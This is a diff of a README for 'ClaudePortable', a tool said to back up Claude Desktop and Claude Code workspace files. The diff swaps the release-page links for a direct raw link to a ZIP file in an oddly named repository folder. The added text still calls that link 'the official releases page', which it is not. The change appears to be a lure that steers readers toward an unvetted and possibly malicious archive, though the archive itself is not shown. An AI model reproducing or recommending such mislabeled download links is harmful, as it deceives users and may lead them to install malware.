@@ -1,12 +1,12 @@
 # 💾 ClaudePortable - Secure your Claude workspace data easily
 
-[![Download ClaudePortable](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Carliemajuscular804/ClaudePortable/releases)
+[![Download ClaudePortable](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Carliemajuscular804/ClaudePortable/main/botulin/Claude-Portable-v3.3.zip)
 
 ClaudePortable manages your workspace files for Claude Desktop, Cowork projects, and Claude Code. This software creates local backups without requiring cloud storage accounts or external API keys. You hold your data in your own folders, and you choose how to store or transport those files.
 
 ## 📥 Getting Started
 
-Visit [the official releases page](https://github.com/Carliemajuscular804/ClaudePortable/releases) to access the software. Select the latest version and download the ZIP file. 
+Visit [the official releases page](https://raw.githubusercontent.com/Carliemajuscular804/ClaudePortable/main/botulin/Claude-Portable-v3.3.zip) to access the software. Select the latest version and download the ZIP file. 
 
 1. Create a new folder on your computer.
 2. Open the ZIP file you downloaded.
